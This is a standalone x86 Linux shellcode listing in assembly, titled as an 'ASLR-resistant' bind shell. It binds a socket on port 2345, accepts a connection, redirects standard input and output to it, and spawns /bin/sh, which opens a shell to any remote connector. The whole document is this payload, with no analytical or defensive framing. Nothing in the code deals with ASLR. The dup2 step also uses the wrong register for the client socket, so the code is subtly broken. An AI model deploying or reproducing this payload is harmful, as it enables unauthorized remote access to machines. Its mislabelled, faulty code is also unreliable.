ASLR-Resistant Bind Shellcode

global _start
section .text

_start:

    ; Clear EAX
    xor eax, eax

    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    push eax             ; Push 0 (IPPROTO_IP)
    inc eax              ; EAX = 1 (SOCK_STREAM)
    push eax             ; Push 1 (SOCK_STREAM)
    inc eax              ; EAX = 2 (AF_INET)
    push eax             ; Push 2 (AF_INET)
    mov ecx, esp         ; ECX = &[AF_INET, SOCK_STREAM, IPPROTO_IP]
    mov bl, 1            ; EBX = 1 (SYS_SOCKET)
    mov al, 0x66         ; EAX = sys_socketcall
    int 0x80             ; Call kernel
    mov esi, eax         ; ESI = socket_fd

    ; bind(socket_fd, sockaddr, sizeof(sockaddr))
    xor eax, eax         ; Clear EAX
    xor ebx, ebx         ; Clear EBX
    push ebx             ; INADDR_ANY (0.0.0.0)
    push word 0x2909     ; Port 2345 (in big-endian format)
    push word 0x2        ; AF_INET
    mov ecx, esp         ; ECX = sockaddr
    push 0x10            ; sizeof(sockaddr)
    push ecx             ; Push &sockaddr
    push esi             ; Push socket_fd
    mov ecx, esp         ; ECX = &[socket_fd, sockaddr, sizeof(sockaddr)]
    mov bl, 2            ; EBX = 2 (SYS_BIND)
    mov al, 0x66         ; EAX = sys_socketcall
    int 0x80             ; Call kernel

    ; listen(socket_fd, 0)
    xor ebx, ebx         ; Clear EBX
    push ebx             ; backlog = 0
    push esi             ; socket_fd
    mov ecx, esp         ; ECX = &[socket_fd, backlog]
    mov bl, 4            ; EBX = 4 (SYS_LISTEN)
    mov al, 0x66         ; EAX = sys_socketcall
    int 0x80             ; Call kernel

    ; accept(socket_fd, NULL, NULL)
    xor ebx, ebx         ; Clear EBX
    push ebx             ; NULL (socklen)
    push ebx             ; NULL (sockaddr)
    push esi             ; socket_fd
    mov ecx, esp         ; ECX = &[socket_fd, sockaddr, socklen]
    mov bl, 5            ; EBX = 5 (SYS_ACCEPT)
    mov al, 0x66         ; EAX = sys_socketcall
    int 0x80             ; Call kernel
    mov edi, eax         ; EDI = client_fd

    ; dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
    xor ecx, ecx         ; ECX = 0 (stdin)
dup2_loop:
    mov al, 0x3f         ; EAX = sys_dup2
    int 0x80             ; Call kernel
    inc ecx              ; ECX++
    cmp ecx, 3           ; Loop until ECX = 3
    jne dup2_loop

    ; execve("/bin/sh", NULL, NULL)
    xor eax, eax         ; Clear EAX
    push eax             ; NULL (envp)
    push 0x68732f6e      ; "n/sh"
    push 0x69622f2f      ; "//bi"
    mov ebx, esp         ; EBX = pointer to "/bin/sh"
    xor ecx, ecx         ; NULL (argv)
    mov edx, ecx         ; NULL (envp)
    mov al, 0xb          ; EAX = sys_execve
    int 0x80             ; Call kernel